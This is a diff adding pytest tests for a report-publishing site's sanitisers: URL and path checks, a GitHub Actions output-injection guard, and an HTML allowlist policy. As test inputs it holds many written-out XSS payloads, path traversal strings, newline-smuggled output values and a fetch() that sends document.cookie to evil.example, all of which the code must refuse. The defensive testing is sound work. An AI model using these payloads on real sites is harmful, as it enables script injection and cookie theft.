@@ -1387,6 +1387,22 @@ def test_theme_switch_markup_matches_the_packaged_styles(tmp_path: Path):
     ("value", "expected"),
     [
         ("https://github.com/x/y", "https://github.com/x/y"),
+        (
+            "https://docs.livingprooflabs.com/reading-reports.html",
+            "https://docs.livingprooflabs.com/reading-reports.html",
+        ),
+        (
+            "https://github.com/Living-Proof-Labs/capability-verifier/commit/" + "c" * 40,
+            "https://github.com/Living-Proof-Labs/capability-verifier/commit/" + "c" * 40,
+        ),
+        # The reporter never links to an IP literal, so none is allowed.
+        ("https://[2001:db8::1]/x", None),
+        ("https://[::1]/", None),
+        ("https://@example.com/", None),
+        (
+            "https://docs.livingprooflabs.com:8443/path",
+            "https://docs.livingprooflabs.com:8443/path",
+        ),
         ("../runs/1/", "../runs/1/"),
         ("#summary", "#summary"),
         ("javascript:alert(1)", None),
@@ -1398,6 +1414,12 @@ def test_theme_switch_markup_matches_the_packaged_styles(tmp_path: Path):
         ("//evil.example/x", None),
         ("https:evil", None),
         ("https://[::1", None),
+        ("https://user:pass@example.com/", None),
+        ("https://user@example.com/", None),
+        ("https://exa mple.com/", None),
+        ("https://exa\tmple.com/", None),
+        ("https://-bad.example/", None),
+        ("https://example.com:99999/", None),
         ("a\\b", None),
         ("", None),
         (None, None),
@@ -1563,6 +1585,8 @@ def test_safe_href_refuses_control_characters_that_urlsplit_keeps(value: str):
         ("INPUT_OUTPUT_DIR", "docs/\x1breports"),
         ("INPUT_ARTIFACT_NAME", "site\nreports-dir=/etc"),
         ("INPUT_ARTIFACT_NAME", "site\n"),
+        # The default artifact-name is built from GITHUB_RUN_ID, so it is checked too.
+        ("GITHUB_RUN_ID", "8\nreports-dir=/etc"),
     ],
 )
 def test_site_action_refuses_control_characters_before_writing_github_output(
@@ -1581,10 +1605,474 @@ def test_site_action_refuses_control_characters_before_writing_github_output(
         "GITHUB_OUTPUT": str(gh_out),
     }
     env[name] = value
-    # Removing the control-character check lets the newline forge a GITHUB_OUTPUT line.
+    # Removing the control-character check lets the newline forge a GITHUB_OUTPUT line,
+    # and validating artifact-name after build() would still write to docs/reports.
     with pytest.raises(site_tool.SiteError, match="control characters"):
         site_action.run_site_action(env)
+    assert not (tmp_path / "docs/reports").exists()
     assert not gh_out.exists()
+
+
+@pytest.mark.parametrize(
+    ("value", "allowed"),
+    [
+        ("evidence/a'b.html", True),
+        ("evidence/a~b!c$d&e(f)g*h+i,j;k=l@m%20n-o_p.q", True),
+        ("%2e%2e%2f", False),
+        ("%2E%2E/", False),
+        ("evidence/%2e%2e/secret", False),
+        ("a/./b", False),
+        ("./a", False),
+        ("a/.", False),
+        ("evidence/%2e/b", False),
+        ("evidence/a%00b", False),
+        ("evidence/a%01b", False),
+        ("evidence/a%1fb", False),
+        ("evidence/a%7fb", False),
+        # Each of these is refused only after decoding, by its own check.
+        ("evidence/a%3Ab", False),
+        ("evidence/a%5Cb", False),
+        ("%2Fetc/passwd", False),
+        ("evidence%2Factions%2Fruns", False),
+        ("evidence/%61rtifact.zip", False),
+        # And these only before decoding.
+        ("/evidence/a", False),
+        ("evidence/action/runs", True),
+        ("x/actions/y", False),
+        ("evidence/Artifacts.zip", False),
+        ("evidence/%aartifact.zip", False),
+    ],
+)
+def test_site_path_refuses_encoded_traversal_dot_segments_and_encoded_controls(
+    value: str, allowed: bool
+):
+    import reports_common
+
+    assert (reports_common.site_path(value) == value) is allowed
+
+
+# ---------------------------------------------------------------- va#20 N1: published report HTML
+
+
+REPORTER_FIXTURE = ROOT / "tests/fixtures/reporter/report-v3.15.4.html"
+
+HOSTILE_REPORT_MARKUP = [
+    "<SCRIPT>alert(1)</SCRIPT>",
+    "<script src='https://evil.example/x.js'></script>",
+    "<script data-report-times/>alert(1)</script>",
+    "<svg onload=alert(1)></svg>",
+    "<svg/onload=alert(1)>",
+    "<img src=x onerror=alert(1)>",
+    "<IMG SRC=x OnError=alert(1)>",
+    "<img srcset='https://evil.example/x.png 1x'>",
+    "<img src='evidence/x.png' onerror='alert(1)'>",
+    "<details open ontoggle=alert(1)><summary>x</summary></details>",
+    "<a href='https://ok.example/' onclick='alert(1)'>x</a>",
+    "<a href=javascript:alert(1)>x</a>",
+    "<a href='&#106;avascript:alert(1)'>x</a>",
+    "<a href='javascript&colon;alert(1)'>x</a>",
+    "<a href='javascript&#58;alert(1)'>x</a>",
+    "<a href='java&Tab;script:alert(1)'>x</a>",
+    "<a href='data:text/html,<script>alert(1)</script>'>x</a>",
+    "<a href='http://insecure.example/'>x</a>",
+    "<a href='//evil.example/'>x</a>",
+    "<a href='https://user:pass@evil.example/'>x</a>",
+    "<a href='https://ok.example/' href='javascript:alert(1)'>x</a>",
+    "<a/href='javascript:alert(1)'>x</a>",
+    # Written so a browser and this parser could read the attributes differently.
+    "<a/href='https://ok.example/'>x</a>",
+    "<p title='x'class='y'>x</p>",
+    "<p title=a`b>x</p>",
+    "<p title=x=y>x</p>",
+    "<p class='a' class='b'>x</p>",
+    # Elements outside the reporter's vocabulary, even with no attributes.
+    "<iframe></iframe>",
+    "<object></object>",
+    "<xmp><img src=x onerror=alert(1)></xmp>",
+    "<plaintext>",
+    "<base>",
+    "<marquee>x",
+    "<noscript></noscript>",
+    "<math><mi>x</mi></math>",
+    "<svg><style>p{color:red}</style></svg>",
+    "<a href='https://ok.example/'/onclick=alert(1)>x</a>",
+    "<div style='background:url(https://evil.example/x)'>x</div>",
+    "<div style='background:u\\72l(https://evil.example/x)'>x</div>",
+    "<div style='background:image-set(\"https://evil.example/x\" 1x)'>x</div>",
+    "<style>@import 'https://evil.example/x.css';</style>",
+    "<style>body{background:url(https://evil.example/x)}</style>",
+    "<style>body{background:URL( 'https://evil.example/x' )}</style>",
+    "<style/>body{background:url(https://evil.example/x)}</style>",
+    "<svg><style><img src=x onerror=alert(1)></style></svg>",
+    "<svg><p>breakout</p></svg>",
+    "<p><div></div><svg></p><style><img src=x onerror=alert(1)></style></svg>",
+    "<svg><a xlink:href='javascript:alert(1)'><text>x</text></a></svg>",
+    "<svg><use href='https://evil.example/x.svg#a'/></svg>",
+    "<svg><rect fill='url(https://evil.example/x#a)'/></svg>",
+    "<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>",
+    "<svg><animate attributeName='href' to='javascript:alert(1)'/></svg>",
+    "<math><mi xlink:href='javascript:alert(1)'>x</mi></math>",
+    "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'></iframe>",
+    "<iframe src='https://evil.example/'></iframe>",
+    "<object data='https://evil.example/x.swf'></object>",
+    "<embed src='https://evil.example/x.swf'>",
+    "<base href='https://evil.example/'>",
+    "<meta http-equiv='refresh' content='0;url=https://evil.example/'>",
+    "<meta charset='utf-7'>",
+    "<link rel='stylesheet' href='https://evil.example/x.css'>",
+    "<form action='https://evil.example/'><input name='q'></form>",
+    "<button formaction='javascript:alert(1)'>x</button>",
+    "<input type='image' src='https://evil.example/x.png'>",
+    "<video src='evidence/x.mp4' poster='javascript:alert(1)'></video>",
+    "<video><source src='https://evil.example/x.mp4'></video>",
+    "<noscript><p title='</noscript><img src=x onerror=alert(1)>'></p></noscript>",
+    "<textarea><img src=x onerror=alert(1)></textarea>",
+    "<template><img src=x onerror=alert(1)></template>",
+    "<title><img src=x onerror=alert(1)></title>",
+    "<!--><img src=x onerror=alert(1)>-->",
+    "<!-- note -->",
+    "<![CDATA[<img src=x onerror=alert(1)>]]>",
+    "<?xml-stylesheet href='https://evil.example/x.xsl'?>",
+    "<!DOCTYPE html SYSTEM 'https://evil.example/x.dtd'>",
+    "<p>1 < 2</p>",
+    "<p>x</p><img src=x onerror=alert(1)",
+    "<p>a\x00b</p>",
+    # va#20 round 2. Old html.parser reads <title> as ordinary markup and misses these
+    # script ends, so the browser-rule scan must refuse them on every Python (B1).
+    '<title><p title="</title><img src=x onerror=alert(1)>"></p></title>',
+    "<script data-eval-tabs>x</script x><img src=x onerror=alert(1)></script>",
+    "<script data-eval-tabs>x</script/><img src=x onerror=alert(1)></script>",
+    "<script data-eval-tabs>x</script ><img src=x onerror=alert(1)></script>",
+    "<script data-eval-tabs>x</script >",
+    # Reached by input, each refused by one guard (B3).
+    "<script data-eval-tabs>x",
+    "<style>p{color:red}",
+    "<svg><img src='evidence/a.png'/></svg>",
+    "<p>x</p></marquee>",
+    "<div style='background:url(\"data:font/woff2;base64,url(https://evil.example/x)\")'>x</div>",
+]
+
+# Cases the html.parser layer is not there for: the control-character check comes first, and
+# html.parser alone accepts the rest on some Python releases, which is what the scan is for.
+NOT_PARSER_MARKUP = {
+    "<p>a\x00b</p>",
+    '<title><p title="</title><img src=x onerror=alert(1)>"></p></title>',
+    "<script data-eval-tabs>x</script x><img src=x onerror=alert(1)></script>",
+    "<script data-eval-tabs>x</script/><img src=x onerror=alert(1)></script>",
+}
+
+
+def _page(markup: str) -> str:
+    return f"<!doctype html><html lang='en'><body><main>{markup}</main></body></html>\n"
+
+
+@pytest.mark.parametrize("markup", HOSTILE_REPORT_MARKUP)
+def test_report_html_policy_refuses_hostile_markup(markup: str):
+    import reports_render
+
+    # Each case gets past at least one rule; dropping that rule from the policy fails it.
+    with pytest.raises(site_tool.SiteError):
+        reports_render.checked_report_html(_page(markup), "probe")
+
+
+@pytest.mark.parametrize("markup", [m for m in HOSTILE_REPORT_MARKUP if m not in NOT_PARSER_MARKUP])
+def test_parser_allowlist_alone_refuses_hostile_markup(markup: str):
+    import reports_render
+
+    # The html.parser layer is tested without the scan in front of it, so each of its
+    # rules stays tested even where the scan refuses the same input first.
+    with pytest.raises(site_tool.SiteError):
+        reports_render._parsed_policy(_page(markup))
+
+
+# The browser-rule scan (B1). Each case is refused by the scan on its own, on every Python.
+SCAN_REFUSED_MARKUP = [
+    # Vera's B1 page: a browser closes <title> early and runs the onerror.
+    '<title><p title="</title><img src=x onerror=alert(1)>"></p></title>',
+    "<title>a<b</title>",
+    "<textarea><b>x</b></textarea>",
+    "<title>x</TITLE>",
+    "<title>x",
+    "<title/>x</title>",
+    "<script data-eval-tabs>x</script x>",
+    "<script data-eval-tabs>x</script/>",
+    "<script data-eval-tabs>x</script >",
+    "<script data-eval-tabs>x</SCRIPT>",
+    "<script data-eval-tabs>x",
+    "<script data-eval-tabs/>x</script>",
+    "<script data-eval-tabs><!--<script>x</script>y</script>",
+    "<script data-eval-tabs>a</p>b</script>",
+    "<style>p{}</style >",
+    "<style>a</p>b</style>",
+    "<style><!--p{}--></style>",
+    # Attribute values may not hold markup, and an unquoted one may not end in "/".
+    '<p title="a<b">x</p>',
+    '<p title="a>b">x</p>',
+    "<p title='a<b'>x</p>",
+    "<img src=evidence/a.png/>",
+    # Only a browser's whitespace separates attributes.
+    "<p\u00a0title=x>x</p>",
+    "<p title=x\u00a0class=y>x</p>",
+    "<p title='x'class='y'>x</p>",
+    # Every "<" begins a plain tag or the doctype.
+    "< p>x</p>",
+    "<p>1 < 2</p>",
+    "<p>x</p ></p>",
+    "<a/href='https://ok.example/'>x</a>",
+    "<!-- note -->",
+    "<!DOCTYPE html SYSTEM 'https://evil.example/x.dtd'>",
+    "<?xml-stylesheet href='https://evil.example/x.xsl'?>",
+    "<![CDATA[x]]>",
+    "<p>x</p><img src=x onerror=alert(1)",
+]
+
+
+@pytest.mark.parametrize("markup", SCAN_REFUSED_MARKUP)
+def test_browser_rule_scan_refuses_ambiguous_markup(markup: str):
+    import reports_render
+
+    with pytest.raises(site_tool.SiteError):
+        reports_render._scan_markup(_page(markup))
+    with pytest.raises(site_tool.SiteError):
+        reports_render.checked_report_html(_page(markup), "probe")
+
+
+@pytest.mark.parametrize(
+    "markup",
+    [
+        '<p title="a&gt;b" class=x>x</p>',
+        "<img src=evidence/a.png alt=x>",
+        "<p\ttitle=x\nclass='y'\f\rid=\"z\">x</p>",
+        "<svg viewBox='0 0 1 1'><title>t</title><path d='M0 0'/></svg>",
+        "<style>/* #evaluator-<id> */p{}</style>",
+        "<script data-eval-tabs>if(a<b){}</script>",
+        "<br/><hr />",
+    ],
+)
+def test_browser_rule_scan_accepts_plain_markup(markup: str):
+    import reports_render
+
+    reports_render._scan_markup(_page(markup))
+
+
+@pytest.mark.parametrize("tail", ["<script data-eval-tabs>x", "<title>x", "<style>p{}"])
+def test_browser_rule_scan_refuses_a_raw_text_element_that_never_closes(tail: str):
+    import reports_render
+
+    # Nothing after it, not even another end tag.
+    with pytest.raises(site_tool.SiteError, match="does not end"):
+        reports_render._scan_markup("<!doctype html><p>x</p>" + tail)
+
+
+def test_browser_rule_scan_accepts_the_real_reporter_page():
+    import reports_render
+
+    reports_render._scan_markup(REPORTER_FIXTURE.read_text(encoding="utf-8"))
+
+
+def test_real_reporter_report_passes_the_policy_byte_for_byte():
+    import reports_render
+
+    text = REPORTER_FIXTURE.read_text(encoding="utf-8")
+    # A real v3.15.4 page: inline fonts, both reporter scripts, SVG, video and links.
+    for marker in ("<script data-eval-tabs>", "<script data-report-times>", "<svg", "<video"):
+        assert marker in text
+    assert reports_render.checked_report_html(text, "fixture") == text
+
+
+def test_unknown_reporter_script_is_removed_with_a_warning(capsys):
+    import reports_render
+
+    page = (
+        "<!doctype html><html lang='en'><body><p>kept</p>"
+        "<script data-report-times>fetch('https://evil.example/'+document.cookie)</script>"
+        "<p>also kept</p></body></html>\n"
+    )
+    cleaned = reports_render.checked_report_html(page, "probe")
+    assert cleaned == (
+        "<!doctype html><html lang='en'><body><p>kept</p><p>also kept</p></body></html>\n"
+    )
+    assert "not a known reporter script" in capsys.readouterr().err
+
+
+def _forged_run(runs_in: Path, html_text: str, **kwargs) -> Path:
+    folder = _make_run_folder(runs_in, "hallway", run_id="909", html_override=html_text, **kwargs)
+    # A forged run folder recomputes SHA256SUMS, so the checksums still match.
+    (folder / "SHA256SUMS").write_text(
+        "".join(
+            f"{hashlib.sha256((folder / n).read_bytes()).hexdigest()}  {n}\n"
+            for n in site_tool.REPORT_FILES
+        ),
+        encoding="utf-8",
+    )
+    return folder
+
+
+def test_forged_run_folder_with_recomputed_sha256sums_and_hostile_report_is_refused(
+    tmp_path: Path,
+):
+    hostile = "<!doctype html><html><body><main><svg onload=alert(1)></svg></main></body></html>\n"
+    _forged_run(tmp_path / "in", hostile)
+    reports_dir = tmp_path / "reports"
+    with pytest.raises(site_tool.SiteError, match="onload"):
+        site_tool.build(reports_dir, tmp_path / "in")
+    assert not list(reports_dir.rglob("runs/909/index.html"))
+
+
+def test_report_html_file_is_checked_where_it_is_written(tmp_path: Path):
+    folder = tmp_path / "run"
+    folder.mkdir()
+    hostile = "<!doctype html><html><body><img src=x onerror=alert(1)></body></html>\n"
+    with pytest.raises(site_tool.SiteError, match="onerror"):
+        site_tool.publish_report_files(folder, hostile)
+    assert not (folder / "report.html").exists()
+
+
+def test_deleting_the_artifact_word_cannot_assemble_a_fetch(tmp_path: Path):
+    # The site deletes the word "artifact" after reading the page; the policy runs on the
+    # page it publishes, so "uartifactrl(" turning into "url(" is still refused.
+    hostile = (
+        "<!doctype html><html><head><style>body{background:uartifactrl(https://evil.example/x)}"
+        "</style></head><body><main><p>x</p></main></body></html>\n"
+    )
+    _forged_run(tmp_path / "in", hostile)
+    with pytest.raises(site_tool.SiteError, match="style"):
+        site_tool.build(tmp_path / "reports", tmp_path / "in")
+
+
+def test_real_reporter_report_is_published_unchanged(tmp_path: Path):
+    text = REPORTER_FIXTURE.read_text(encoding="utf-8")
+    _make_run_folder(tmp_path / "in", "hallway", run_id="910", html_override=text)
+    site_tool.build(tmp_path / "reports", tmp_path / "in")
+    run_dir = tmp_path / "reports/unitree-g1/stock-mujoco-hallway/runs/910"
+    assert (run_dir / "report.html").read_text(encoding="utf-8") == text
+    page = (run_dir / "index.html").read_text(encoding="utf-8")
+    for marker in ("<script data-eval-tabs>", "<script data-report-times>", "<video"):
+        assert marker in page
+
+
+# Evidence a browser could run as a document on the Pages origin. GitHub Pages serves .xsd
+# and .rng as application/xml, and Chrome runs the XHTML script inside (B2).
+DROPPED_EVIDENCE = {
+    "plot.svg": b"<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>",
+    "page.htm": b"<script>alert(1)</script>",
+    "doc.xhtml": b"<html xmlns='http://www.w3.org/1999/xhtml'><script>alert(1)</script></html>",
+    "sub/page.html": b"<script>alert(1)</script>",
+    "schema.xsd": b"<r xmlns:h='http://www.w3.org/1999/xhtml'><h:script>alert(1)</h:script></r>",
+    "grammar.rng": b"<r xmlns:h='http://www.w3.org/1999/xhtml'><h:script>alert(1)</h:script></r>",
+    "data.unknownext": b"<script>alert(1)</script>",
+    "noext": b"<script>alert(1)</script>",
+}
+# What reporters emit, and the plain formats a browser only displays.
+KEPT_EVIDENCE = {
+    name: b"x"
+    for name in (
+        "trial.mcap seed-01.mp4 clip.webm clip.mov clip.mkv clip.avi frame.png frame.jpg "
+        "frame.jpeg frame.gif frame.webp sub/media.json run.txt run.log notes.md table.csv"
+    ).split()
+}
+
+
+@pytest.mark.parametrize("stored", [False, True])
+def test_only_allowlisted_evidence_types_are_published(tmp_path: Path, stored: bool):
+    files = {**KEPT_EVIDENCE, **DROPPED_EVIDENCE}
+    folder = _make_run_folder(tmp_path / "in", "hallway", run_id="911", evidence_files=files)
+    if stored:
+        # run.json can name evidence files directly, which skipped the old .html filter.
+        record = json.loads((folder / "run.json").read_text(encoding="utf-8"))
+        record["evidence"] = [
+            {"label": name, "kind": "note", "files": [{"path": f"evidence/{name}"}]}
+            for name in files
+        ]
+        (folder / "run.json").write_text(json.dumps(record), encoding="utf-8")
+    site_tool.build(tmp_path / "reports", tmp_path / "in")
+    evidence = tmp_path / "reports/unitree-g1/stock-mujoco-hallway/runs/911/evidence"
+    published = {p.relative_to(evidence).as_posix() for p in evidence.rglob("*") if p.is_file()}
+    assert set(KEPT_EVIDENCE) <= published
+    assert not published & set(DROPPED_EVIDENCE)
+
+
+# ---------------------------------------------------------------- va#20 N1: restored runs
+
+
+def _restored_run(tmp_path: Path) -> tuple[Path, Path]:
+    _make_run_folder(tmp_path / "in1", "hallway", run_id="920", created="2026-11-20T06:00:00Z")
+    reports = tmp_path / "reports"
+    site_tool.build(reports, tmp_path / "in1")
+    return reports, reports / "unitree-g1/stock-mujoco-hallway/runs/920"
+
+
+def _build_next_run(tmp_path: Path, reports: Path) -> None:
+    _make_run_folder(tmp_path / "in2", "hallway", run_id="921", created="2026-11-21T06:00:00Z")
+    site_tool.build(reports, tmp_path / "in2")
+
+
+def test_a_clean_restored_run_is_rechecked_and_kept(tmp_path: Path):
+    reports, run = _restored_run(tmp_path)
+    # A genuine listing page, written by the site's own write_listing, next to the
+    # evidence it lists.
+    import reports_render
+
+    (run / "evidence/clip").mkdir(parents=True, exist_ok=True)
+    files = []
+    for name in ("trial-01.mp4", "trial-02.mp4"):
+        (run / "evidence/clip" / name).write_bytes(b"mp4")
+        files.append({"path": f"evidence/clip/{name}", "bytes": 3, "sha256": "0" * 64})
+    reports_render.write_listing(
+        run, {"label": "clip", "name": "clip", "preserved": True, "files": files}, "../../../../"
+    )
+    assert (run / "evidence/clip.html").is_file()
+    before = {p: p.read_bytes() for p in run.rglob("*") if p.is_file()}
+    _build_next_run(tmp_path, reports)
+    assert {p: p.read_bytes() for p in run.rglob("*") if p.is_file()} == before
+    assert (reports / "unitree-g1/stock-mujoco-hallway/runs/921/index.html").is_file()
+
+
+@pytest.mark.parametrize("page", ["report.html", "index.html"])
+@pytest.mark.parametrize(
+    "injected",
+    [
+        "<img src=x onerror=alert(1)>",
+        # An unknown script would be removed from a new page; a restored one fails the build.
+        "<script data-report-times>alert(1)</script>",
+    ],
+)
+def test_a_hostile_restored_page_fails_the_next_build(tmp_path: Path, page: str, injected: str):
+    reports, run = _restored_run(tmp_path)
+    path = run / page
+    text = path.read_text(encoding="utf-8")
+    path.write_text(text.replace("</body>", injected + "</body>", 1), encoding="utf-8")
+    with pytest.raises(site_tool.SiteError, match="restored"):
+        _build_next_run(tmp_path, reports)
+
+
+@pytest.mark.parametrize(
+    "planted",
+    [
+        "<!doctype html><html><body><script>alert(document.domain)</script></body></html>\n",
+        "<!doctype html><html><body><img src=x onerror=alert(1)></body></html>\n",
+        # An unknown script would be cut from a new page; a restored one fails the build.
+        "<!doctype html><html><body><script data-report-times>alert(1)</script></body></html>\n",
+    ],
+)
+def test_a_planted_restored_evidence_page_fails_the_next_build(tmp_path: Path, planted: str):
+    # Vera's round 3 probe (B5): a top-level evidence/*.html in a restored run is a page on
+    # the Pages origin, so it gets the policy check like report.html, not a pass as a listing.
+    reports, run = _restored_run(tmp_path)
+    (run / "evidence").mkdir(exist_ok=True)
+    (run / "evidence/evil.html").write_text(planted, encoding="utf-8")
+    with pytest.raises(site_tool.SiteError, match="restored .*evil.html"):
+        _build_next_run(tmp_path, reports)
+
+
+@pytest.mark.parametrize("name", ["schema.xsd", "sub/page.html", "plot.svg", "noext", "x.HTML"])
+def test_restored_evidence_of_an_unpublished_type_fails_the_next_build(tmp_path: Path, name: str):
+    reports, run = _restored_run(tmp_path)
+    path = run / "evidence" / name
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_bytes(b"<r xmlns:h='http://www.w3.org/1999/xhtml'><h:script>1</h:script></r>")
+    with pytest.raises(site_tool.SiteError, match="restored"):
+        _build_next_run(tmp_path, reports)
 
 
 # ---------------------------------------------------------------- va#24: API path traversal
@@ -1660,3 +2148,13 @@ def test_workflow_run_id_from_the_api_cannot_change_the_path(monkeypatch):
             "O/N", "1/../../../user", "ghs_testtoken", "https://api.github.com"
         )
     assert calls == []
+
+
+def test_a_restored_html_page_below_the_top_of_evidence_is_never_a_listing(tmp_path: Path):
+    # Listings live only at evidence/<name>.html, so a nested page fails on its type even
+    # when its markup would pass the page policy.
+    reports, run = _restored_run(tmp_path)
+    (run / "evidence/sub").mkdir(parents=True, exist_ok=True)
+    (run / "evidence/sub/page.html").write_text("<!doctype html><p>x</p>\n", encoding="utf-8")
+    with pytest.raises(site_tool.SiteError, match="evidence of this type is not published"):
+        _build_next_run(tmp_path, reports)
